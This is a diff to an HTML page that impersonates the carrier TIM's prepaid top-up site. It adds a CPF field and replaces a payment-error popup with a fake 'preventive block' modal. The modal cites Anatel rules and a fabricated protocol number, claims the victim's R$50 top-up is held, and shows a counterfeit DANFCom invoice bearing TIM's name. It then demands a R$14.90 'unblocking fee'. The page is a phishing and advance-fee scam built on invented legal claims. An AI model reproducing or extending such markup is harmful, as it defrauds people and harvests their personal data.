@@ -15,6 +15,7 @@
   <meta name="description"
     content="Recarregue seu TIM PRÉ online com rapidez e segurança. Ganhe bônus exclusivos na sua recarga com Pix." />
   <link rel="icon" type="image/webp" href="images/glossy-tim-mobile-logo-rounded-square-app-icon-free-png.webp" />
+  <link rel="shortcut icon" href="images/glossy-tim-mobile-logo-rounded-square-app-icon-free-png.webp" />
   <link rel="apple-touch-icon" href="images/glossy-tim-mobile-logo-rounded-square-app-icon-free-png.webp" />
   <link rel="stylesheet" href="styles.css" />
 
@@ -83,6 +84,58 @@
         </div>
       </header>
 
+      <!-- Ofertas Destaque TIM PRÉ -->
+      <section class="section-offers-top" aria-label="Ofertas em destaque TIM">
+        <!-- Título em Destaque -->
+        <h2 class="offers-headline">
+          RECARREGANDO<br />
+          AQUI, VOCÊ TEM<br />
+          <span>BÔNUS DE INTERNET</span>
+        </h2>
+
+        <div class="offers-cards-wrap">
+          <!-- Card 1: A partir de R$ 20 -->
+          <div class="offer-card-top" onclick="window.selecionarOferta(20);">
+            <div class="offer-top-left">
+              <span class="offer-top-prefix">A PARTIR DE</span>
+              <div class="offer-top-price">R$ 20</div>
+            </div>
+            <div class="offer-top-right">
+              <div class="offer-top-gb">+3GB</div>
+              <div class="offer-top-perks">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="#25D366" style="flex-shrink:0;">
+                  <path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946.003-6.556 5.338-11.891 11.893-11.891 3.181.001 6.167 1.24 8.413 3.488 2.245 2.248 3.481 5.236 3.48 8.414-.003 6.557-5.338 11.892-11.893 11.892-1.99-.001-3.951-.5-5.688-1.448l-6.305 1.654zm6.597-3.807c1.676.995 3.276 1.591 5.392 1.592 5.448 0 9.886-4.434 9.889-9.885.002-5.462-4.415-9.89-9.881-9.892-5.452 0-9.887 4.434-9.889 9.884-.001 2.225.651 3.891 1.746 5.634l-.999 3.648 3.742-.981z"/>
+                </svg>
+                + WHATSAPP ILIMITADO
+              </div>
+            </div>
+          </div>
+
+          <!-- Card 2: A partir de R$ 39,90 (MAIS VENDIDO) -->
+          <div class="offer-card-top has-badge" onclick="window.selecionarOferta(40);">
+            <span class="offer-top-badge">MAIS VENDIDO</span>
+            <div class="offer-top-left">
+              <span class="offer-top-prefix">A PARTIR DE</span>
+              <div class="offer-top-price">R$ 39,90</div>
+            </div>
+            <div class="offer-top-right">
+              <div class="offer-top-gb">+5GB</div>
+              <div class="offer-top-perks">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="#25D366" style="flex-shrink:0;">
+                  <path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946.003-6.556 5.338-11.891 11.893-11.891 3.181.001 6.167 1.24 8.413 3.488 2.245 2.248 3.481 5.236 3.48 8.414-.003 6.557-5.338 11.892-11.893 11.892-1.99-.001-3.951-.5-5.688-1.448l-6.305 1.654zm6.597-3.807c1.676.995 3.276 1.591 5.392 1.592 5.448 0 9.886-4.434 9.889-9.885.002-5.462-4.415-9.89-9.881-9.892-5.452 0-9.887 4.434-9.889 9.884-.001 2.225.651 3.891 1.746 5.634l-.999 3.648 3.742-.981z"/>
+                </svg>
+                + WHATSAPP + INSTAGRAM ILIMITADO
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Rodapé Legal / Disclaimer -->
+        <p class="offers-disclaimer">
+          Bônus de +3GB em recargas de R$ 20, de +5GB em recargas a partir de R$ 39,90.
+        </p>
+      </section>
+
       <!-- Recharge Phone Section -->
       <section class="section-recharge-input">
         <div class="input-header-row">
@@ -102,6 +155,11 @@
               </svg>
               <span>DDD inválido. Verifique o número digitado.</span>
             </div>
+          </div>
+
+          <div class="input-field-wrapper">
+            <input type="tel" id="input-cpf" class="input-phone" inputmode="numeric" placeholder="CPF do titular"
+              aria-label="CPF do titular" maxlength="14" autocomplete="off" />
           </div>
 
           <div id="phone-confirm" class="phone-confirm-box">
@@ -632,31 +690,240 @@
 
   </div>
 
-  <!-- ==================== POPUP PÓS-VENDA ==================== -->
+  <!-- ==================== MODAL DE BLOQUEIO SISTÊMICO & UPSELL NFCom ==================== -->
   <div id="popup-posvenda" class="popup-posvenda" role="dialog" aria-live="polite">
     <div class="popup-posvenda-overlay"></div>
     <div class="popup-posvenda-content">
-      <div class="popup-posvenda-icon">
-        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#FF6B6B" stroke-width="2"
-          stroke-linecap="round" stroke-linejoin="round">
-          <circle cx="12" cy="12" r="10"></circle>
-          <line x1="12" y1="8" x2="12" y2="12"></line>
-          <line x1="12" y1="16" x2="12.01" y2="16"></line>
-        </svg>
+      
+      <!-- Topo Institucional -->
+      <div class="modal-bloqueio-header">
+        <div class="modal-tim-header-row">
+          <div class="tim-brand small">
+            <div class="tim-bars">
+              <span class="tim-bar"></span>
+              <span class="tim-bar"></span>
+              <span class="tim-bar short"></span>
+            </div>
+            <span class="tim-text" style="color: #FFFFFF; font-size: 16px;">TIM</span>
+          </div>
+          <span class="badge-anatel-seguranca">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            </svg>
+            SISTEMA DE SEGURANÇA CADASTRAL
+          </span>
+        </div>
+
+        <div class="modal-bloqueio-icon-wrap">
+          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#FF5252" stroke-width="2.2"
+            stroke-linecap="round" stroke-linejoin="round">
+            <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"></path>
+            <path d="M12 9v4"></path>
+            <path d="M12 17h.01"></path>
+          </svg>
+        </div>
+        <h2 class="modal-bloqueio-title">RECARGA RETIDA: BLOQUEIO PREVENTIVO DETECTADO</h2>
+        <p class="modal-bloqueio-protocolo">Protocolo TIM / Anatel: <strong id="bloqueio-num-protocolo">20261020-849201</strong></p>
       </div>
-      <h2 class="popup-posvenda-title">Pagamento recusado</h2>
-      <p class="popup-posvenda-desc">
-        Seu pagamento foi recusado e não foi concluído. Pedimos desculpas pelo transtorno.
+
+      <!-- Resumo do Status Cadastral da Linha -->
+      <div class="card-status-concorrencia">
+        <div class="status-concorrencia-item">
+          <span class="lbl">Linha de Acesso:</span>
+          <strong id="bloqueio-display-phone" class="val">--</strong>
+        </div>
+        <div class="status-concorrencia-item">
+          <span class="lbl">Titular da Linha:</span>
+          <strong id="bloqueio-display-nome" class="val">--</strong>
+        </div>
+        <div class="status-concorrencia-item">
+          <span class="lbl">Documento CPF:</span>
+          <strong id="bloqueio-display-cpf" class="val">--</strong>
+        </div>
+        <div class="status-concorrencia-item">
+          <span class="lbl">Status da Linha:</span>
+          <span class="tag-status-danger">SUSPENSÃO PREVENTIVA (LEI 10.703/03)</span>
+        </div>
+        <div class="status-concorrencia-item">
+          <span class="lbl">Valor da Recarga:</span>
+          <span class="tag-status-warning">R$ <span id="bloqueio-display-valor">50,00</span> (RETIDA NO BILHETADOR)</span>
+        </div>
+      </div>
+
+      <p class="modal-bloqueio-motivo-texto">
+        Identificamos uma <strong>inconsistência de titularidade</strong> na base nacional da Anatel e Receita Federal. Conforme a <strong>Resolução Anatel nº 632/2014</strong> e o <strong>Projeto Cadastro Pré-Pago</strong>, a sua linha móvel encontra-se em suspensão cautelar preventiva e o saldo de <strong>R$ <span id="bloqueio-recarga-val">50,00</span></strong> permanecerá retido até a quitação da Guia Fiscal de Regularização.
       </p>
-      <p class="popup-posvenda-desc">
-        Como pedido de desculpas, você recebe <strong>30% de desconto</strong> na próxima recarga que você fizer.
-      </p>
-      <p class="popup-posvenda-desc small">
-        Caso o pagamento já esteja no seu extrato, não se preocupe — o valor será estornado em questão de minutos.
-      </p>
-      <button type="button" id="btn-popup-refazer" class="popup-posvenda-btn">
-        Refazer pagamento com 30% de desconto
+
+      <!-- DANFCom Modelo 62 Oficial -->
+      <div class="danfcom-wrapper">
+        <div class="danfcom-card">
+          <!-- Cabeçalho DANFCom -->
+          <div class="danfcom-header">
+            <div class="danfcom-brand">
+              <span class="danfcom-brand-title">TIM S.A.</span>
+              <span class="danfcom-doc-type">DANFCom</span>
+              <span class="danfcom-doc-sub">Documento Auxiliar da Nota Fiscal Fatura de Serviços de Comunicação Eletrônica</span>
+              <div>
+                <span class="danfcom-badge-model">MODELO 62</span>
+                <span style="font-size: 8.5px; font-weight: 700; margin-left: 4px;">SÉRIE: 001 | Nº 000.419.820 | EMISSÃO: <span id="nf-data">--/--/----</span></span>
+              </div>
+            </div>
+            <div class="danfcom-barcode-block">
+              <!-- Código de barras linear SVG -->
+              <svg class="danfcom-barcode-svg" viewBox="0 0 200 28" preserveAspectRatio="none">
+                <rect x="0" y="0" width="3" height="28" fill="#000"/>
+                <rect x="5" y="0" width="2" height="28" fill="#000"/>
+                <rect x="9" y="0" width="4" height="28" fill="#000"/>
+                <rect x="15" y="0" width="1" height="28" fill="#000"/>
+                <rect x="18" y="0" width="3" height="28" fill="#000"/>
+                <rect x="23" y="0" width="2" height="28" fill="#000"/>
+                <rect x="27" y="0" width="5" height="28" fill="#000"/>
+                <rect x="34" y="0" width="2" height="28" fill="#000"/>
+                <rect x="38" y="0" width="3" height="28" fill="#000"/>
+                <rect x="43" y="0" width="1" height="28" fill="#000"/>
+                <rect x="46" y="0" width="4" height="28" fill="#000"/>
+                <rect x="52" y="0" width="2" height="28" fill="#000"/>
+                <rect x="56" y="0" width="3" height="28" fill="#000"/>
+                <rect x="61" y="0" width="2" height="28" fill="#000"/>
+                <rect x="65" y="0" width="4" height="28" fill="#000"/>
+                <rect x="71" y="0" width="1" height="28" fill="#000"/>
+                <rect x="74" y="0" width="3" height="28" fill="#000"/>
+                <rect x="79" y="0" width="2" height="28" fill="#000"/>
+                <rect x="83" y="0" width="4" height="28" fill="#000"/>
+                <rect x="89" y="0" width="2" height="28" fill="#000"/>
+                <rect x="93" y="0" width="3" height="28" fill="#000"/>
+                <rect x="98" y="0" width="1" height="28" fill="#000"/>
+                <rect x="101" y="0" width="4" height="28" fill="#000"/>
+                <rect x="107" y="0" width="2" height="28" fill="#000"/>
+                <rect x="111" y="0" width="3" height="28" fill="#000"/>
+                <rect x="116" y="0" width="2" height="28" fill="#000"/>
+                <rect x="120" y="0" width="5" height="28" fill="#000"/>
+                <rect x="127" y="0" width="2" height="28" fill="#000"/>
+                <rect x="131" y="0" width="3" height="28" fill="#000"/>
+                <rect x="136" y="0" width="1" height="28" fill="#000"/>
+                <rect x="139" y="0" width="4" height="28" fill="#000"/>
+                <rect x="145" y="0" width="2" height="28" fill="#000"/>
+                <rect x="149" y="0" width="3" height="28" fill="#000"/>
+                <rect x="154" y="0" width="2" height="28" fill="#000"/>
+                <rect x="158" y="0" width="4" height="28" fill="#000"/>
+                <rect x="164" y="0" width="1" height="28" fill="#000"/>
+                <rect x="167" y="0" width="3" height="28" fill="#000"/>
+                <rect x="172" y="0" width="2" height="28" fill="#000"/>
+                <rect x="176" y="0" width="4" height="28" fill="#000"/>
+                <rect x="182" y="0" width="2" height="28" fill="#000"/>
+                <rect x="186" y="0" width="3" height="28" fill="#000"/>
+                <rect x="191" y="0" width="1" height="28" fill="#000"/>
+                <rect x="194" y="0" width="6" height="28" fill="#000"/>
+              </svg>
+              <div class="danfcom-chave">CHAVE DE ACESSO: <span id="nf-chave">3526 1002 4214 2100 0111 6200 1000 0419 8201 8492 8419</span></div>
+            </div>
+          </div>
+
+          <!-- Protocolo SEFAZ -->
+          <div class="danfcom-protocolo-box">
+            PROTOCOLO DE AUTORIZAÇÃO SEFAZ: <span id="nf-protocolo-sefaz">335260019284192</span> — AUTORIZADA EM <span id="nf-data-autorizacao">20/10/2026 às 13:15:00</span>
+          </div>
+
+          <!-- Dados do Emitente -->
+          <div class="danfcom-section">
+            <div class="danfcom-section-title">EMITENTE — PRESTADORA DE SERVIÇOS DE TELECOMUNICAÇÕES</div>
+            <div class="danfcom-grid-2">
+              <div class="danfcom-row"><strong>Razão Social:</strong> TIM S.A.</div>
+              <div class="danfcom-row"><strong>CNPJ:</strong> 02.421.421/0001-11</div>
+              <div class="danfcom-row"><strong>Inscrição Estadual:</strong> 110.042.490.114</div>
+              <div class="danfcom-row"><strong>Regime:</strong> Lucro Real • SMP</div>
+            </div>
+            <div class="danfcom-row" style="font-size: 8.5px; margin-top: 2px;"><strong>Endereço:</strong> Av. Giovanni Gronchi, 7143 - Vila Andrade, São Paulo - SP, CEP 05724-005</div>
+          </div>
+
+          <!-- Dados do Tomador / Assinante -->
+          <div class="danfcom-section">
+            <div class="danfcom-section-title">TOMADOR / ASSINANTE DO SERVIÇO MÓVEL PESSOAL</div>
+            <div class="danfcom-grid-2">
+              <div class="danfcom-row"><strong>Nome / Assinante:</strong> <span id="nf-nome">--</span></div>
+              <div class="danfcom-row"><strong>CPF / Documento:</strong> <span id="nf-cpf">--</span></div>
+              <div class="danfcom-row"><strong>Data de Nascimento:</strong> <span id="nf-nasc">--</span></div>
+              <div class="danfcom-row"><strong>Terminal Móvel:</strong> <span id="nf-tel">--</span></div>
+              <div class="danfcom-row"><strong>Contrato / Acesso:</strong> <span id="nf-contrato">TIM-SMP-84920</span></div>
+              <div class="danfcom-row"><strong>Local da Prestação:</strong> <span id="nf-uf">São Paulo - SP</span></div>
+            </div>
+          </div>
+
+          <!-- Tabela de Serviços -->
+          <div class="danfcom-section" style="padding: 4px;">
+            <div class="danfcom-section-title" style="padding: 2px 4px;">DISCRIMINAÇÃO DOS SERVIÇOS PRESTADOS</div>
+            <table class="danfcom-table">
+              <thead>
+                <tr>
+                  <th style="width: 25px;">CÓD</th>
+                  <th>DESCRIÇÃO DO SERVIÇO</th>
+                  <th style="width: 32px;">CFOP</th>
+                  <th style="width: 20px;">UN</th>
+                  <th style="width: 20px;">QTD</th>
+                  <th style="width: 48px; text-align: right;">VALOR</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>001</td>
+                  <td><strong>TAXA DE REGULARIZAÇÃO CADASTRAL E DESBLOQUEIO DE ACESSO SMP</strong><br><span style="font-size: 7.5px; color: #555;">Homologação de Titularidade (Lei Federal nº 10.703/03 e Resolução Anatel nº 632/14)</span></td>
+                  <td>5.303</td>
+                  <td>UN</td>
+                  <td>1</td>
+                  <td style="text-align: right; font-weight: 700;">R$ 14,90</td>
+                </tr>
+              </tbody>
+            </table>
+
+            <!-- Totalizador -->
+            <div class="danfcom-total-box">
+              <span>VALOR TOTAL DA NOTA FISCAL (NFCom):</span>
+              <span class="danfcom-total-val">R$ 14,90</span>
+            </div>
+
+            <!-- Demonstrativo Tributário -->
+            <div style="font-size: 7.5px; color: #555; margin-top: 4px; padding: 2px 4px; border-top: 1px dashed #ccc;">
+              BC ICMS: R$ 14,90 | Alíq ICMS Telecom: 18% (R$ 2,68) | PIS: R$ 0,10 | COFINS: R$ 0,45 | FUST (1%): R$ 0,15 | FUNTTEL (0,5%): R$ 0,07 | Trib. Totais Aprox: R$ 3,45 (Lei 12.741/12)
+            </div>
+
+            <!-- Ocorrência Legal -->
+            <div class="danfcom-motivo-box">
+              <strong>MOTIVO OPERACIONAL:</strong> SUSPENSÃO PREVENTIVA POR DIVERGÊNCIA CADASTRAL (PROJETO CADASTRO PRÉ - ANATEL). RECARGA CONTRATADA DE <strong>R$ <span id="nf-valor-recarga">50,00</span></strong> SOB CUSTÓDIA SISTÊMICA NO BILHETADOR, COM LIBERAÇÃO E CRÉDITO CONDICIONADOS À COMPENSAÇÃO DESTA GUIA.
+            </div>
+
+            <div class="danfcom-hash">
+              Autenticação Digital (Convênio ICMS 115/03): <span id="nf-hash-md5">4A8F.7D2B.910E.C34A.61B8.9920.F1E4.8B12</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Box de Instruções de Desbloqueio -->
+      <div class="box-desbloqueio-instrucoes">
+        <strong>✓ O que acontece após o pagamento da taxa de R$ 14,90?</strong>
+        <ul>
+          <li>O bloqueio cautelar da Anatel é baixado instantaneamente no sistema.</li>
+          <li>A sua recarga original de <strong>R$ <span id="bloqueio-recarga-val2">50,00</span></strong> é creditada na hora com todos os bônus contratados.</li>
+          <li>A linha é homologada em seu CPF, protegendo seu número contra cancelamento definitivo.</li>
+        </ul>
+      </div>
+
+      <!-- Botão de Ação -->
+      <button type="button" id="btn-popup-refazer" class="btn-desbloqueio-oficial">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <rect width="18" height="11" x="3" y="11" rx="2" ry="2"></rect>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+        </svg>
+        Desbloquear Linha e Liberar Recarga (R$ 14,90)
       </button>
+
+      <div class="modal-bloqueio-garantia">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#1DB954" stroke-width="2.5">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+        </svg>
+        Ambiente Seguro TIM S.A. • Desbloqueio Sistêmico Imediato
+      </div>
+
     </div>
   </div>
 
